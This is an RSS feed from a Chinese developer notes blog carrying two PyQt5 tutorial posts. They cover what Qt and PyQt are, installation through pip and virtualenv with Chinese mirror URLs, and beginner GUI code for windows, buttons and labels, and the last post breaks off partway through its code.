<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="https://www.geekery.cn/rss.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <atom:link href="https://www.geekery.cn/rss.xml" rel="self" type="application/rss+xml"/>
    <title>运维开发绿皮书</title>
    <link>https://www.geekery.cn/</link>
    <description>放置运维开发笔记、搜集、摘录、实践，保持好奇心，看文需谨慎，后果很严重！</description>
    <language>zh-CN</language>
    <pubDate>Thu, 29 Jan 2026 05:55:58 GMT</pubDate>
    <lastBuildDate>Thu, 29 Jan 2026 05:55:58 GMT</lastBuildDate>
    <generator>@vuepress/plugin-feed</generator>
    <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
    <category>Tools</category>
    <category>笔记</category>
    <item>
      <title>001-PyQt介绍与安装</title>
      <link>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/001-PyQt%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%AE%89%E8%A3%85.html</link>
      <guid>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/001-PyQt%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%AE%89%E8%A3%85.html</guid>
      <source url="https://www.geekery.cn/rss.xml">001-PyQt介绍与安装</source>
      <description>001-PyQt介绍与安装 一、介绍 1. Qt Qt 是什么 Qt（官方发音 [kju:t]）是一个跨平台的C++开发库，主要用来开发图形用户界面（Graphical User Interface，GUI）程序 Qt 是纯 C++ 开发的，正常情况下需要先学习C语言、然后在学习C++然后才能使用Qt开发带界面的程序 多亏了开源社区使得Qt 还可以用P...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>一、介绍</h2>
<h3>1. Qt</h3>
<p></p>
<p>Qt（官方发音 <code>[kju:t]</code>）是一个跨平台的C++开发库，主要用来开发图形用户界面（Graphical User Interface，GUI）程序</p>
<p>Qt 是纯 C++ 开发的，正常情况下需要先学习C语言、然后在学习C++然后才能使用Qt开发带界面的程序</p>
<p>多亏了开源社区使得<strong>Qt 还可以用Python、Ruby、Perl 等脚本语言进行开发。</strong></p>
<p><strong>Qt 支持的操作系统有很多，例如通用操作系统 Windows、Linux、Unix，智能手机系统Android、iOS， 嵌入式系统等等</strong>。可以说是跨平台的</p>
<p>QT官网：https://doc.qt.io/qt-5/index.html</p>
<h3>2. PyQt</h3>
<p>PyQt的开发者是英国的“Riverbank  Computing”公司。它提供了GPL（简单的说，以GPL协议发布到网上的素材，你可以使用，也可以更改，但是经过你更改然后再次发布的素材必须也遵守GPL协议，主要要求是必须开源，而且不能删减原作者的声明信息等）与商业协议两种授权方式，因此它可以免费地用于自由软件的开发。</p>
<p><strong>PyQt可以运行于Microsoft Windows、Mac OS X、Linux以及Unix的多数变种上</strong>。</p>
<p>PyQt是Python语言的GUI（Graphical User Interface，简称 GUI，又称图形用户接口）编程解决方案之一</p>
<p>可以用来代替Python内置的<code>Tkinter</code>。其它替代者还有<code>PyGTK</code>、<code>wxPython</code>等，与Qt一样，PyQt是一个自由软件</p>
<p>文档相关地址：https://www.riverbankcomputing.com/software/pyqt/</p>
<p>比较不错的参考资料：https://wiki.python.org/moin/PyQt/Tutorials</p>
<h3>3. 一句话概括</h3>
<ul>
<li>Qt (C++ 语言 GUI  )</li>
<li>PyQt =  Python  +  Qt技术</li>
</ul>
<h3>4. Python GUI开发热门选择</h3>
<ul>
<li>
<p>Tkinter</p>
<p>Python官方采用的标准库，优点是作为Python标准库、稳定、发布程序较小，缺点是控件相对较少。</p>
</li>
<li>
<p>wxPython</p>
<p>基于wxWidgets的Python库，优点是控件比较丰富，缺点是稳定性相对差点、文档少、用户少。</p>
</li>
<li>
<p>PySide2、PyQt5</p>
<p>基于Qt 的Python库，优点是控件比较丰富、跨平台体验好、文档完善、用户多。</p>
<p>缺点是 库比较大，发布出来的程序比较大。</p>
<p>PyQt5 的开发者是英国的“Riverbank Computing”公司  ， 而 PySide2 则是 qt 针对python语言提供的专门</p>
</li>
</ul>
<h2>二、安装</h2>
<p>下面我们以在Python虚拟环境中，使用pip进行安装PyQT</p>
<h3>1. 创建新的虚拟环境</h3>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>mkvirtualenv -p python3 py3-qt --no-download</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<h3>2. 安装pyqt5（命令行）</h3>
<ol>
<li>
<p>切换到指定的虚拟环境</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>workon py3-qt</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
</ol>
<p></p>
<p>安装pyqt5</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>pip install pyqt5 -i https://pypi.tuna.tsinghua.edu.cn/simple</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><ol>
<li></li>
</ol>
<h3>3. 安装pyqt5（pycharm图形界面）</h3>
<p></p>
<h3>4. 安装成功效果如下</h3>
<p><img src="https://doc.itprojects.cn/0001.zhishi/python.0008.pyqt5rumen/assets/image-20201026150340265.png" alt="image-20201026150340265"></p>
<p>在当前安装PyQt的虚拟环境中输入如下测试代码：</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 如果执行成功，没有任何错误提示，则表明环境搭建成功</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5 </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QtWidgets</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 当然也可以查看PyQt版本</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtCore </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">QT_VERSION_STR</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>5. 注意</h3>
<p>如果安装缓慢，可以尝试修改pip加速，加速地址如下</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>阿里云  https://mirrors.aliyun.com/pypi/simple/</span></span>
<span class="line"><span></span></span>
<span class="line"><span>中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/</span></span>
<span class="line"><span></span></span>
<span class="line"><span>豆瓣(douban) https://pypi.douban.com/simple/</span></span>
<span class="line"><span></span></span>
<span class="line"><span>清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/</span></span>
<span class="line"><span></span></span>
<span class="line"><span>中国科学技术大学 https://pypi.mirrors.ustc.edu.cn/simple/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>002-PyQt基本UI</title>
      <link>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/002-PyQt%E5%9F%BA%E6%9C%ACUI.html</link>
      <guid>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/002-PyQt%E5%9F%BA%E6%9C%ACUI.html</guid>
      <source url="https://www.geekery.cn/rss.xml">002-PyQt基本UI</source>
      <description>002-PyQt基本UI 一、第一个PyQt程序 运行上述代码的效果如下： image-20201119172023747 程序解释说明： image-20201119172557560 二、模块介绍 PyQt中有非常多的功能模块,开发中最常用的功能模块主要有三个: QtCore:包含了核心的非GUI的功能。主要和时间、文件与文件夹、各种数据、流、UR...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>一、第一个PyQt程序</h2>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication, QWidget</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 设置窗口标题</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWindowTitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"第一个PyQt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 展示窗口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 程序进行循环等待状态</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行上述代码的效果如下：</p>
<p></p>
<p>程序解释说明：</p>
<p></p>
<h2>二、模块介绍</h2>
<p>PyQt中有非常多的功能模块,开发中最常用的功能模块主要有三个:</p>
<ul>
<li><strong>QtCore</strong>:包含了核心的非GUI的功能。主要和时间、文件与文件夹、各种数据、流、URLs、mime类文件、进程与线程一起使用</li>
<li><strong>QtGui</strong>:包含了窗口系统、事件处理、2D图像、基本绘画、字体和文字类</li>
<li><strong>QtWidgets</strong>:包含了一些列创建桌面应用的UI元素</li>
</ul>
<p>可以参考PyQt官网的所有模块，地址：https://www.riverbankcomputing.com/static/Docs/PyQt5/module_index.html#ref-module-index</p>
<p>C++具体实现的API文档，地址：https://doc.qt.io/qt-5/qtwidgets-module.html</p>
<p><strong>用到什么功能就它相关的api或者别人分享的使用心得，这是学习最快的方式</strong></p>
<h2>三、基本UI</h2>
<p>窗口内的所有控件，若想在窗口中显示，都需要表示它的父亲是谁，而不能直接使用 show 函数显示</p>
<h3>1. 按钮</h3>
<p>按钮对应的控件名称为 <code> QPushButton</code>  ， 位于 <code>PyQt5.QtWidgets</code>  里面</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication, QWidget, QPushButton</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 设置窗口标题</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWindowTitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"第一个PyQt程序"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 在窗口里面添加控件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    btn </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QPushButton</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"按钮"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 设置按钮的父亲是当前窗口，等于是添加到窗口中显示</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    btn.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setParent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(w)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 展示窗口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 程序进行循环等待状态</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行效果：</p>
<p></p>
<h3>2. 文本</h3>
<p>纯文本控件名称为 <code> QLabel</code>  ， 位于 <code>PyQt5.QtWidgets</code>  里面</p>
<p>纯文本控件仅仅作为标识显示而已，类似输入内容前的一段标签提示（账号 、密码）</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication, QWidget, QPushButton, QLabel</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 设置窗口标题</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWindowTitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"第一个PyQt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # # 下面创建一个Label，然后调用方法指定父类</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # label = QLabel("账号: ", w)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # # 设置父对象</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # label.setParent(w)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 下面创建一个Label（纯文本），在创建的时候指定了父对象</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    label </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QLabel</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"账号: "</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, w)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 显示位置与大小 ： x, y , w, h</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    label.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setGeometry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">20</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">20</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">30</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">30</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 展示窗口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 程序进行循环等待状态</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行效果：</p>
<p></p>
<h3>3. 输入框</h3>
<p>输入框的控件名称为 <code>QLineEdit</code>， 位于 <code>PyQt5.QtWidgets</code>  里面</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication, QWidget, QPushButton, QLabel, QLineEdit</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 设置窗口标题</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWindowTitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"第一个PyQt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 纯文本</span></span>
